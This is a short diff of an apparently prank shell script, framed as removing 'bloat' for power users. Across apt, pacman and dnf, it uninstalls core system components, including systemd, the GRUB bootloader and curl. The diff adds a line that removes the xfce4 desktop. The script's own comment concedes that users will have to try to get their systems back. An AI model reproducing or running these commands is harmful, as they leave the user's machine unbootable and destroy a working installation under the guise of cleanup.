@@ -21,6 +21,7 @@ apt uninstall systemd
 echo 'bloat for power users to try to get there systems back :P'
 echo 'if err try other operating systems'
 sudo pacman -Rns grub
+sudo pacman -Rns xfce4
 echo 'dnf package manager'
 sudo dnf remove grub
 sudo dnf remove curl
